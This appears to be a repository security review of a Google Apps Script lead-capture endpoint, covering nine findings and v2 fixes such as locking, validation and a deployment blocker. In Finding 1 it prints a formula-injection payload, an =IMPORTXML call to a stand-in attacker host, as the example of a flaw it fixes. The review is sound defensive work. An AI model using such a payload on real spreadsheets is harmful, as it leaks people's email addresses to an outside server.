# 16 · Scorecard capture endpoint — security review and v2

> **Status: committed on the master integration branch for review. Nothing is
> deployed, no endpoint URL or spreadsheet ID is inserted, and capture remains
> disabled.** A separate approved offer-page commit added navigation links to
> nine files under `insights/`; it did not change Scorecard capture
> configuration or endpoint behavior.
>
> **Retraction, 28 Aug.** The status line above previously read *"Nothing
> deployed, nothing committed, no endpoint URL inserted, nothing under
> `insights/` modified."* Two of those four claims were false by the time the
> document was read: this file and the two Scorecard files **were** committed to
> `claude/website-master-integration-2026-08-28` — **not on `main` at the time of
> the original status claim.** That branch has since been merged, so those files
> are on `main` today; the parenthetical here previously read "never to `main`",
> which was true when written and is not true now. And nine
> `insights/` files **were** modified under the separate offer-page
> authorisation. The original wording is recorded here rather than quietly
> replaced, on the same rule applied to the PR #4 claim in §15: a corrected
> statement in this document is always shown next to what it corrected.
>
> `integrations/scorecard-capture.gs` (v1) was reviewed before deployment. It
> **cannot ship** — one finding is a functional blocker that would have caused
> silent, total data loss. `integrations/scorecard-capture.v2.gs` is the
> proposed replacement. v1 is untouched so the two can be diffed.
>
> | | |
> | --- | --- |
> | v1 | `integrations/scorecard-capture.gs` — unmodified, `sha256 53c9707962c92993…` |
> | v2 | `integrations/scorecard-capture.v2.gs` — proposed |
> | Tests | `integrations/scorecard-capture.test.js` — `node integrations/scorecard-capture.test.js` |
> | Result | **33/33 passing** |

---

## The complete numbered findings

Findings 1–7 are from the first review. 8 and 9 were found afterwards — 8 by
investigating the deployment blocker, 9 from the reviewer's own observation
about concurrent writes, which the first review missed.

---

### Finding 8 — active-document methods are unavailable in a web app · **CONFIRMED DEPLOYMENT BLOCKER**

**Status: confirmed by Google's official documentation.** This is no longer an
open question, and v1 must not be deployed.

**Source of proof:** Google Apps Script — *Container-bound scripts*,
<https://developers.google.com/apps-script/guides/bound>

Container-bound scripts obtain their document through the active-document
methods — `SpreadsheetApp.getActiveSpreadsheet()` and `getActive()` — which
resolve only where a container document is actually open and bound to the
execution. A web app invoked over HTTP has no open container: `doGet` and
`doPost` run without any active document, so those methods do not return the
bound spreadsheet.

v1 line 101:

```js
var sheet = SpreadsheetApp.getActiveSpreadsheet().getSheets()[0];
```

With no active spreadsheet, the property access on the returned value throws.

**Why that is worse than a visible error.** v1 wraps `doPost` in `try/catch` and
returns `{ok:false}` — and the front end posts with `mode: 'opaque'`, so the
browser *cannot read the response*. Every visitor would submit their details,
watch the Scorecard open exactly as designed, and have nothing saved. **Silent,
total data loss behind a success-looking UI**, with no error surfaced anywhere
the owner would see it.

> **What is and is not the proof.** The official documentation above is the
> proof. The test suite in this repository is **not** independent confirmation:
> its mocks return `null` from `getActiveSpreadsheet()` *because they were
> written to model the documented behaviour*. They reproduce the failure locally
> so it can be regression-tested — they do not establish it.

**Consequence for `docs/11`.** Step 1 of the activation runbook instructs the
owner to paste v1 and deploy it. **Executed as written, that produces an
endpoint that accepts every submission and stores none.** Step 1 is suspended
until v2 (or an equivalent `openById` fix) is approved.

**Fixed in v2.** `SpreadsheetApp.openById()` with the spreadsheet ID in Script
Properties, plus explicit tab names, plus a `doGet` health check that surfaces
misconfiguration instead of failing silently.

### Finding 1 — Spreadsheet formula injection · **HIGH**

`appendRow()` and `setValue()` treat a leading `=` as a formula. v1 wrote
`first_name` and `email` raw.

```json
{"first_name": "=IMPORTXML(\"https://evil.tld/?x=\"&D2,\"//a\")"}
```

`IMPORT*` functions evaluate when the sheet is opened — no click needed — so
this reads the adjacent email cell and sends it to an attacker's server.
`=HYPERLINK`, `=IMAGE` and `=IMPORTDATA` behave similarly.

**Fixed in v2.** Every user-controlled string passes through `safe_()`, which
flattens control characters, truncates to a per-field limit, and prefixes any
value starting with `=`, `+`, `-` or `@` with an apostrophe so Sheets stores it
as literal text. Verified by test 09 for all four prefixes.

---

### Finding 2 — No rate limiting; spam stored in the leads table · **MEDIUM → not deferred**

Two problems. v1 recorded spam **into the same sheet as real leads**, so
Make.com had no structural way to tell them apart. And nothing capped
submissions at all.

**Deferral was conditioned on this being unable to cause failed submissions.
It can, so it was not deferred.** An unthrottled flood exhausts the ~20k/day
Apps Script execution quota, after which legitimate submissions fail until the
quota resets.

**Fixed in v2, partially — and the residual limit is stated rather than hidden:**

- Spam now goes to a separate **`Spam`** tab. `Leads` contains only valid,
  non-spam captures. Make.com reads `Leads` only.
- Date-stamped counters in Script Properties cap daily writes
  (`MAX_LEAD_WRITES_PER_DAY`, `MAX_SPAM_WRITES_PER_DAY`,
  `MAX_ANALYTICS_WRITES_PER_DAY`), bounding sheet growth and write quota.
- Duplicate capture delivery is checked before the lead counter, so retries do
  not consume the allowance or block later unique leads.
- The counters **fail open** — a Properties outage never costs a real lead
  (test 22).

**Residual, and not solvable inside Apps Script:** the runtime charges for an
invocation *before* this code runs, so execution-quota exhaustion remains
possible. Genuinely fixing that means a challenge in front of the endpoint
(Turnstile/reCAPTCHA) or moving off Apps Script. Recorded under remaining risks.

---

### Finding 3 — Unrestricted result updates · **MEDIUM**

v1's `recordResult_` overwrote nine score columns on any row matching a
submission ID, with no validation. `Number(undefined)` is `NaN`, so a result
payload with a valid ID and no scores corrupted six numeric cells. There was no
range check and no already-completed guard. v1 also appended
`result_without_capture` rows **into the leads table**.

**Fixed in v2.** `validateScores_` enforces the contract derived from the front
end and rejects anything inconsistent — nothing is written on failure. A result
updates **only** an existing, valid, non-spam capture with the same ID. Completed
lead results and pending Analytics results are immutable: an identical retry is
idempotent, while a conflicting retry is refused and the original survives.
Orphan results never touch `Leads` (findings 8/9 below explain where they go).

---

### Finding 4 — `getSheets()[0]` is position-based · **MEDIUM**

Adding a tab and dragging it to the front would send every write to the wrong
sheet, and `findRowById_` would read column 2 of that sheet — potentially
matching unrelated content and overwriting nine arbitrary cells.

**Fixed in v2.** Explicit `getSheetByName()` for `Leads`, `Spam` and
`Analytics`. `setupCaptureEndpoint()` verifies headers exactly and **refuses**
to adopt a tab whose structure differs, rather than writing into it (test 02).

---

### Finding 5 — `findRowById_` re-reads the whole ID column · **LOW**

O(n) read per result. Slow and quota-hungry at scale. **Unchanged in v2** — the
volume this tool will see does not justify an index, and an index is another
thing that can drift out of sync. Recorded as accepted.

---

### Finding 6 — Unbounded row growth · **LOW**

Sheets caps at 10M cells; ~380k rows at 26 columns. **Partly mitigated** by the
daily caps in finding 2, and by spam no longer accumulating in `Leads`.

---

### Finding 7 — "Execute as: Me" and PII governance · **INFO**

The deployed script runs with the owner's Google account privileges. It touches
only the configured spreadsheet — a property of *this code*, not of the
deployment. Re-deploying creates a new version; the old `/exec` keeps serving
old code until the deployment is updated.

The sheet accumulates names, emails and consent records. **Its sharing settings
now matter more than the endpoint does.** v2 adds `consent_version` and
`consent_at` so a record states what was agreed and when.

---

### Finding 9 — Concurrent-write handling · **HIGH** *(reviewer's finding)*

v1 used no locking anywhere. Four distinct races:

**Race A — header creation.** `getLastRow() === 0` then `appendRow(HEADERS)`.
Two simultaneous first requests both see zero and both write headers.

**Race B — torn result write.** Nine separate `setValue()` calls. Two concurrent
results for the same ID interleave, producing `total_score` from one request and
`clarity` from another. *Not* a wrong-row write — appends do not shift existing
indices — but genuine corruption of one row.

**Race C — result before capture. Guaranteed by the front end.** The Scorecard
page fires the capture POST and then calls `onResult()` without awaiting it:

```js
var sending = post(payload);   // capture, not awaited
…
onResult();                     // result, fired immediately after
```

If the result is processed first, v1 found no matching row, appended a
standalone `result_without_capture` row, and then the capture appended a second
row. **Two rows for one person: scores on one, name and email on the other.**
That breaks the one-row-per-person guarantee the whole design rests on, and it
breaks the Make.com follow-up, which needs the weakest signal on the row that
has the email.

**Race D** — nine round trips widen B's window.

**Fixed in v2.** `LockService.getScriptLock()` wraps every capture and result
transaction, with a timeout and a `finally` release (test 15). Scores are one
batch `setValues()` (test 14). Race C is resolved properly rather than merely
serialised: an early result parks in `Analytics`, and the capture **claims and
merges it** onto the lead row, marking the analytics row `merged_to_lead`
(test 12).

**One better fix is not in this script**, because it lives in a file this change
does not touch: have the front end `await` the capture before firing the result.
That is a one-line change in `insights/resources/trust-first-content-scorecard/index.html`.
The lock and the merge make the script correct either way; awaiting would make
the *ordering* correct rather than merely recovered.

---

## What changed, v1 → v2

| | v1 | v2 |
| --- | --- | --- |
| Spreadsheet access | `getActiveSpreadsheet()` — **returns null in a web app** | `openById()` + ID in Script Properties |
| Tabs | first sheet by position | `Leads`, `Spam`, `Analytics` by name |
| Setup | paste and deploy | `setupCaptureEndpoint()` — creates, verifies, freezes, refuses mismatches |
| Reset instructions | "delete the sheet's first row" | delete the **tab** and re-run setup |
| Locking | none | `LockService` on every write path |
| Formula injection | unescaped | `safe_()` neutralises `= + - @` and control chars |
| Request size | unbounded | 4096 bytes, checked before parsing |
| Event handling | anything not `result` treated as a capture | strict `capture` / `result` allowlist |
| Submission ID | any string, 80 chars | UUID v1–5 or `tfcs-` fallback format only |
| Score validation | none | range, integer, sum, band and weakest-signal consistency |
| Score write | 9 × `setValue()` | 1 × `setValues()` |
| Spam | stored in the leads table | isolated in `Spam` |
| Orphan results | `result_without_capture` **in leads** | `Analytics`, merged on capture |
| Anonymous results | mixed into leads | `Analytics` only, no name/email columns |
| Consent | opt-in flag only | `consent_version` + `consent_at` + campaign preserved |
| Rate limiting | none | daily caps; retries do not consume lead allowance; cap refusals return failure |
| `doGet` | `{ok:true}` | configuration and tab health check, no rows or IDs |
| Diagnostics | none | `console.error` reason codes, never PII |

## The Make.com contract

Read the **`Leads`** tab only. Send only where:

```
follow_up_opt_in = "yes"   AND   spam_reason is blank
```

`spam_reason` is always blank in `Leads` by construction — it is retained as a
column so the filter is explicit and survives future changes. `Spam` and
`Analytics` are never lead sources. `sequence_state` remains Make's column; this
script never writes it.

## Tests

`node integrations/scorecard-capture.test.js` — 33 checks, all passing. The
harness runs the real `.gs` source in a VM with mocked Apps Script services,
including a `getActiveSpreadsheet()` that returns null so the v1 blocker is
*reproduced* rather than asserted.

## Remaining risks

1. **Execution-quota DoS is not solvable in Apps Script.** The runtime charges
   for the invocation before this code can decline it. Needs a challenge in
   front of the endpoint, or a different platform.
2. **Race C is recovered, not prevented.** The front-end `await` is the real
   fix and is outside this change.
3. **The mocks are not Google.** Real concurrency, real quota behaviour and real
   Sheets formula evaluation are unproven until deployed. The apostrophe-prefix
   defence in particular should be confirmed once with a live test row.
4. **Finding 5 accepted** — O(n) ID lookup, adequate at expected volume.
5. **Sheet sharing is now the primary control.** The endpoint cannot read data;
   anyone with access to the spreadsheet can read all of it.
6. **`consent_version` must be bumped by hand** when the opt-in wording changes.
   Nothing enforces that.

## Deployment order

1. Approve v2.
2. Replace `integrations/scorecard-capture.gs` with the v2 content (or keep both
   and point setup at v2).
3. Create the Sheet, paste the script, set `SETUP_SPREADSHEET_ID`, run
   `setupCaptureEndpoint`, confirm **SETUP COMPLETE**.
4. Deploy as a web app — Execute as **Me**, access **Anyone**.
5. Open the `/exec` URL: expect `{"ok":true,"configured":true}` with all three
   tabs `true`. **This step is what would have caught the v1 blocker.**
6. Only then paste the URL into the Scorecard page and push.
